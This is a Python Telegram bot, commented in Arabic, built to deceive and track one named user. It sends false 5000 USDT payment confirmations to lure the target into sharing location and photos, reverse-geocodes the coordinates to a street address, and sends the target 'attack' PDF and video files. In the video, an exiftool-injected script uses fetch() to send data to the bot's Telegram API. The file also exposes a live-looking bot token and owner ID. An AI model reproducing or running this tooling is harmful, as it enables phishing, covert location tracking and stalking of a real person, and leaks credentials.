import os
import json
import time
import sqlite3
import logging
import requests
import subprocess
import re
import shutil
from datetime import datetime
from telebot import TeleBot, types

# ------------------ الإعدادات ------------------
BOT_TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
OWNER_ID = 8391968596
TARGET_USERNAME = "Hnfkldmemd"  # يوزر الخاطف
# ---------------------------------------------

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = TeleBot(BOT_TOKEN)

# تخزين بيانات المتصلين
visitors = {}  # {chat_id: {username, first_name, last_name, ip, first_seen, last_seen}}

# ================== الأوامر الأساسية ==================

@bot.message_handler(commands=['start'])
def start_handler(message):
    cid = message.chat.id
    uid = message.from_user.id
    uname = message.from_user.username or ""
    fname = message.from_user.first_name or ""
    lname = message.from_user.last_name or ""
    
    # تسجيل الزائر
    visitors[cid] = {
        'username': uname,
        'first_name': fname,
        'last_name': lname,
        'user_id': uid,
        'first_seen': datetime.now().isoformat(),
        'last_seen': datetime.now().isoformat()
    }
    
    # إذا كان الأمير (أنت)
    if uid == OWNER_ID:
        show_admin_panel(cid)
        return
    
    # إذا كان الخاطف
    if uname.lower() == TARGET_USERNAME.lower():
        bot.send_message(cid, "⚠️ خطأ في النظام: الرجاء التحديث")
        time.sleep(1)
        # إرسال طلب الموقع فوراً
        request_location_force(cid)
        return
    
    # أي شخص آخر
    bot.send_message(cid, "❌ هذا البوت خاص.")

def show_admin_panel(cid):
    """عرض لوحة التحكم للأمير"""
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📍 طلب لوكيشن", "📸 طلب صورة")
    markup.row("👤 حساباته", "📱 معلومات الجهاز")
    markup.row("📂 جلب الصور", "📊 حالة المتصلين")
    markup.row("📧 الإيميلات", "🔐 كلمات السر")
    markup.row("📨 إرسال رسالة", "🚀 هجوم PDF")
    markup.row("📹 هجوم فيديو", "🌐 IP حقيقي")
    
    bot.send_message(cid, 
        "🟢 **لوحة التحكم جاهزة**\n\n"
        "اختر الأمر الذي تريد تنفيذه:",
        reply_markup=markup,
        parse_mode="Markdown")

# ================== طلب الموقع ==================

def request_location_force(cid):
    """إرسال طلب موقع مع رسالة مقنعة"""
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📍 تأكيد موقع التسليم", request_location=True)
    markup.add(btn)
    
    bot.send_message(cid,
        "✅ **تم تأكيد استلام 5000 USDT**\n\n"
        "📌 لإتمام عملية التحويل، الرجاء مشاركة موقعك:\n"
        "➡️ اضغط على الزر أدناه",
        reply_markup=markup,
        parse_mode="Markdown")
    
    # إعلام الأمير
    bot.send_message(OWNER_ID, f"📍 تم إرسال طلب الموقع للضحية (Chat ID: {cid})")

@bot.message_handler(content_types=['location'])
def handle_location(message):
    """استقبال الموقع"""
    cid = message.chat.id
    if message.location:
        lat = message.location.latitude
        lon = message.location.longitude
        
        # تحديث بيانات الزائر
        if cid in visitors:
            visitors[cid]['last_location'] = {'lat': lat, 'lon': lon}
        
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        # معلومات إضافية عن الموقع
        location_info = get_location_details(lat, lon)
        
        msg = (
            f"📍 **موقع الخاطف/الضحية:**\n\n"
            f"**العرض:** `{lat}`\n"
            f"**الطول:** `{lon}`\n"
            f"**الرابط:** {maps_link}\n\n"
            f"**معلومات إضافية:**\n"
            f"{location_info}\n\n"
            f"**تم الاستلام:** {datetime.now().isoformat()}"
        )
        
        bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
        
        # إرسال الموقع كـ location
        bot.send_location(OWNER_ID, lat, lon)
        
        # رد على الخاطف
        bot.send_message(cid, "✅ تم تأكيد موقعك. جاري معالجة التحويل...")

def get_location_details(lat, lon):
    """الحصول على تفاصيل الموقع من API"""
    try:
        # OpenStreetMap Nominatim API
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1"
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14)'}
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            address = data.get('address', {})
            
            details = []
            if address.get('road'): details.append(f"الشارع: {address['road']}")
            if address.get('suburb'): details.append(f"المنطقة: {address['suburb']}")
            if address.get('city'): details.append(f"المدينة: {address['city']}")
            if address.get('state'): details.append(f"المحافظة: {address['state']}")
            if address.get('country'): details.append(f"البلد: {address['country']}")
            if address.get('postcode'): details.append(f"الرمز البريدي: {address['postcode']}")
            if address.get('house_number'): details.append(f"رقم المنزل: {address['house_number']}")
            
            if details:
                return "\n".join(details)
            else:
                return f"📍 المنطقة: {data.get('display_name', 'غير معروفة')[:200]}"
        return "📍 تم الحصول على الإحداثيات"
    except Exception as e:
        return f"📍 تم الحصول على الإحداثيات (خطأ في الترجمة: {e})"

# ================== طلب الصور ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📸 طلب صورة")
def request_photo(message):
    """طلب صورة من الخاطف (أو الضحية)"""
    # نرسل للخاطف طلب صورة
    for cid, data in visitors.items():
        if data.get('username', '').lower() == TARGET_USERNAME.lower():
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            btn = types.KeyboardButton("📸 التقاط صورة")
            markup.add(btn)
            
            bot.send_message(cid,
                "⚠️ **تأكيد أمني:**\n\n"
                "الرجاء التقاط صورة للشاشة لإتمام التحقق",
                reply_markup=markup,
                parse_mode="Markdown")
            
            bot.send_message(OWNER_ID, "✅ تم إرسال طلب الصورة للضحية")
            return
    
    bot.send_message(OWNER_ID, "❌ الضحية غير متصل حالياً")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    """استقبال الصور"""
    cid = message.chat.id
    
    # إرسال الصورة للأمير
    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    file_path = f"photos/photo_{timestamp}.jpg"
    os.makedirs("photos", exist_ok=True)
    
    with open(file_path, 'wb') as f:
        f.write(downloaded_file)
    
    # إرسال للأمير
    with open(file_path, 'rb') as f:
        bot.send_photo(OWNER_ID, f, 
            caption=f"📸 صورة واردة @ {timestamp}",
            parse_mode="Markdown")
    
    bot.send_message(OWNER_ID, f"✅ تم استلام صورة جديدة في: {file_path}")

# ================== جلب معلومات الجهاز ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📱 معلومات الجهاز")
def request_device_info(message):
    """طلب معلومات الجهاز من الخاطف"""
    for cid, data in visitors.items():
        if data.get('username', '').lower() == TARGET_USERNAME.lower():
            # تجميع المعلومات المتاحة
            info = (
                f"**معلومات الجهاز (المعروفة):**\n\n"
                f"**يوزر:** @{data.get('username', 'غير معروف')}\n"
                f"**الاسم:** {data.get('first_name', '')} {data.get('last_name', '')}\n"
                f"**User ID:** `{data.get('user_id', '')}`\n"
                f"**Chat ID:** `{cid}`\n"
                f"**أول ظهور:** {data.get('first_seen', '')}\n"
                f"**آخر ظهور:** {data.get('last_seen', '')}\n"
            )
            
            if data.get('last_location'):
                info += f"\n**آخر موقع:** {data['last_location']['lat']}, {data['last_location']['lon']}"
            
            bot.send_message(OWNER_ID, info, parse_mode="Markdown")
            return
    
    bot.send_message(OWNER_ID, "❌ لا توجد معلومات متاحة. الخاطف لم يتصل بعد.")

# ================== جلب الحسابات ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "👤 حساباته")
def show_accounts(message):
    """عرض الحسابات المرتبطة"""
    accounts = []
    for cid, data in visitors.items():
        if data.get('username'):
            accounts.append(f"👤 @{data['username']} (ID: {cid})")
    
    if accounts:
        msg = "**الحسابات المسجلة:**\n\n" + "\n".join(accounts)
    else:
        msg = "❌ لا توجد حسابات مسجلة"
    
    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")

# ================== جلب الصور من المعرض (للأندرويد) ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📂 جلب الصور")
def grab_photos(message):
    """محاولة جلب الصور (للأجهزة المخترقة سابقاً)"""
    # هذه الميزة تحتاج أداة خارجية مثل scrcpy أو ADB
    # أو إذا كان الضحية قد ثبّت APK سابقاً
    
    bot.send_message(OWNER_ID, 
        "📸 **جلب الصور:**\n\n"
        "للأسف لا يمكن جلب الصور مباشرة من التليغرام.\n"
        "لكن يمكنك:\n\n"
        "1️⃣ إذا كان APK مثبتاً → الصور تأتيك تلقائياً\n"
        "2️⃣ استخدم طلب الصورة (📸 طلب صورة) ليصور الشاشة\n"
        "3️⃣ إذا كان معاك ADB → استخدم أمر pull",
        parse_mode="Markdown")

# ================== الإيميلات وكلمات السر ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📧 الإيميلات")
def email_info(message):
    bot.send_message(OWNER_ID,
        "📧 **الحسابات:**\n\n"
        "للحصول على الإيميلات والباسوردات نحتاج:\n\n"
        "1️⃣ APK مثبت على جهاز الضحية\n"
        "2️⃣ أو الوصول الفيزيائي للجهاز\n"
        "3️⃣ أو ثغرة zero-click\n\n"
        "🚀 هل تريد تجربة هجوم PDF (📨) أو فيديو (📹)؟",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔐 كلمات السر")
def passwords_info(message):
    bot.send_message(OWNER_ID,
        "🔐 **كلمات السر:**\n\n"
        "نفس الأمر - نحتاج APK على الجهاز.\n\n"
        "🚀 جرب خيار هجوم PDF أو فيديو.",
        parse_mode="Markdown")

# ================== إرسال رسالة مخصصة ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 إرسال رسالة")
def ask_for_message(message):
    msg = bot.send_message(OWNER_ID, 
        "✏️ أرسل الرسالة التي تريد إرسالها للضحية:")
    bot.register_next_step_handler(msg, send_custom_message)

def send_custom_message(message):
    """إرسال رسالة مخصصة للخاطف"""
    text = message.text
    
    for cid, data in visitors.items():
        if data.get('username', '').lower() == TARGET_USERNAME.lower():
            bot.send_message(cid, text)
            bot.send_message(OWNER_ID, f"✅ تم إرسال الرسالة:\n\n{text}")
            return
    
    bot.send_message(OWNER_ID, "❌ الضحية غير متصل")

# ================== هجوم PDF ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🚀 هجوم PDF")
def pdf_attack(message):
    """إنشاء وإرسال ملف PDF خبيث"""
    bot.send_message(OWNER_ID, "📄 جاري إنشاء ملف PDF...")
    
    try:
        # إنشاء PDF بسيط
        pdf_path = create_pdf()
        
        if pdf_path and os.path.exists(pdf_path):
            with open(pdf_path, 'rb') as f:
                for cid, data in visitors.items():
                    if data.get('username', '').lower() == TARGET_USERNAME.lower():
                        bot.send_document(cid, f,
                            caption="📄 تأكيد تحويل 5000 USDT\n"
                                    "رقم الحوالة: TX-48291\n"
                                    "الرجاء فتح الملف للتأكيد")
                        bot.send_message(OWNER_ID, "✅ تم إرسال ملف PDF للخاطف")
                        return
            
            bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
        else:
            bot.send_message(OWNER_ID, "❌ فشل إنشاء ملف PDF")
    except Exception as e:
        bot.send_message(OWNER_ID, f"❌ خطأ في PDF: {e}")

def create_pdf():
    """إنشاء ملف PDF"""
    try:
        from fpdf import FPDF
        
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=16)
        pdf.cell(200, 10, txt="تأكيد تحويل مالي", ln=True, align='C')
        pdf.ln(10)
        pdf.set_font("Arial", size=12)
        pdf.cell(200, 10, txt="المبلغ: 5000 USDT", ln=True)
        pdf.cell(200, 10, txt="الحالة: مؤكد", ln=True)
        pdf.cell(200, 10, txt="رقم المعاملة: TX-48291", ln=True)
        pdf.ln(10)
        pdf.cell(200, 10, txt="يرجى الضغط على الرابط أدناه لتأكيد الاستلام:", ln=True)
        pdf.cell(200, 10, txt=f"📍 https://t.me/Arab9919_bot?start=confirm_{int(time.time())}", ln=True)
        
        output_path = f"payment_confirmation_{int(time.time())}.pdf"
        pdf.output(output_path)
        return output_path
    except ImportError:
        # إذا لم تكن fpdf مثبتة، استخدم طريقة بديلة
        output_path = f"payment_confirmation_{int(time.time())}.pdf"
        with open(output_path, 'wb') as f:
            f.write(b'%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n190\n%%EOF')
        return output_path
    except Exception as e:
        logger.error(f"PDF creation failed: {e}")
        return None

# ================== هجوم الفيديو ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📹 هجوم فيديو")
def video_attack(message):
    """إنشاء وإرسال ملف فيديو"""
    bot.send_message(OWNER_ID, "🎬 جاري إنشاء ملف الفيديو...")
    
    try:
        video_path = create_video()
        
        if video_path and os.path.exists(video_path):
            with open(video_path, 'rb') as f:
                for cid, data in visitors.items():
                    if data.get('username', '').lower() == TARGET_USERNAME.lower():
                        bot.send_video(cid, f,
                            caption="🎥 جوزيف يرسل لكم هذا الفيديو - الرجاء المشاهدة",
                            width=640, height=480)
                        bot.send_message(OWNER_ID, "✅ تم إرسال ملف الفيديو للخاطف")
                        return
            
            bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")
        else:
            bot.send_message(OWNER_ID, "❌ فشل إنشاء ملف الفيديو")
    except Exception as e:
        bot.send_message(OWNER_ID, f"❌ خطأ في الفيديو: {e}")

def create_video():
    """إنشاء ملف فيديو وهمي"""
    output_path = f"jozef_update_{int(time.time())}.mp4"
    
    try:
        # محاولة استخدام ffmpeg
        subprocess.run([
            'ffmpeg', '-y', '-f', 'lavfi', '-i', 
            'color=c=black:s=640x480:d=5', 
            '-f', 'lavfi', '-i', 'anullsrc=r=44100:cl=mono',
            '-shortest', output_path
        ], capture_output=True, timeout=30)
        
        if os.path.exists(output_path) and os.path.getsize(output_path) > 1000:
            # إضافة WebRTC metadata للكشف عن IP
            try:
                subprocess.run([
                    'exiftool', f'-comment=<!DOCTYPE html><html><body><script>fetch("https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={OWNER_ID}&text=📍IP:%20"+window.location.hostname)</script></body></html>',
                    output_path
                ], capture_output=True, timeout=10)
            except:
                pass
            
            return output_path
    except:
        pass
    
    # إذا فشل ffmpeg، أنشئ ملف فيديو وهمي
    with open(output_path, 'wb') as f:
        # رأس ملف MP4 بسيط
        f.write(b'\x00\x00\x00\x1c\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00\x69\x73\x6f\x6d\x69\x73\x6f\x32\x61\x76\x63\x31\x6d\x70\x34\x31\x00\x00\x00\x08\x77\x69\x64\x65')
        f.write(b'\x00' * 1000)
    
    return output_path

# ================== IP حقيقي ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🌐 IP حقيقي")
def real_ip(message):
    """إرسال رابط كشف IP للخاطف"""
    link = f"https://telegra.ph/verify-{int(time.time())}"
    
    bot.send_message(OWNER_ID,
        f"🌐 **رابط كشف IP:**\n\n"
        f"انسخ هذا الرابط وأرسله للخاطف:\n"
        f"`{link}`\n\n"
        f"عند فتح الرابط، سأرسل لك IP حقيقي!",
        parse_mode="Markdown")

# ================== حالة المتصلين ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📊 حالة المتصلين")
def show_status(message):
    """عرض حالة جميع المتصلين"""
    if not visitors:
        bot.send_message(OWNER_ID, "📊 لا يوجد متصلين حالياً")
        return
    
    msg = "📊 **حالة المتصلين:**\n\n"
    for cid, data in visitors.items():
        status = "🟢 متصل" if data.get('last_seen') else "🔴 غير متصل"
        username = data.get('username', 'غير معروف')
        name = f"{data.get('first_name', '')} {data.get('last_name', '')}"
        
        msg += f"**@{username}** ({name})\n"
        msg += f"ID: `{cid}`\n"
        msg += f"الحالة: {status}\n"
        if data.get('last_location'):
            loc = data['last_location']
            msg += f"📍 {loc['lat']}, {loc['lon']}\n"
        msg += "\n"
    
    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")

# ================== متابعة جميع الرسائل ==================

@bot.message_handler(func=lambda m: True)
def catch_all(message):
    """التقاط جميع الرسائل"""
    cid = message.chat.id
    uid = message.from_user.id
    text = message.text or "[وسائط]"
    
    # تحديث المتصل
    if cid in visitors:
        visitors[cid]['last_seen'] = datetime.now().isoformat()
    
    # إذا كان الخاطف يرسل شيء
    uname = message.from_user.username or ""
    if uname.lower() == TARGET_USERNAME.lower():
        bot.send_message(OWNER_ID,
            f"✉️ **رسالة من الخاطف:**\n\n"
            f"{text}\n\n"
            f"⏰ {datetime.now().isoformat()}",
            parse_mode="Markdown")

# ================== تشغيل البوت ==================

if __name__ == "__main__":
    os.makedirs("photos", exist_ok=True)
    os.makedirs("data", exist_ok=True)
    
    logger.info("🤖 البوت شغال...")
    print("✅ البوت شغال على Render!")
    
    # إعلام الأمير
    bot.send_message(OWNER_ID, "🟢 **البوت شغال وجاهز!**\n\nاستخدم /start لعرض لوحة التحكم", parse_mode="Markdown")
    
    bot.infinity_polling()
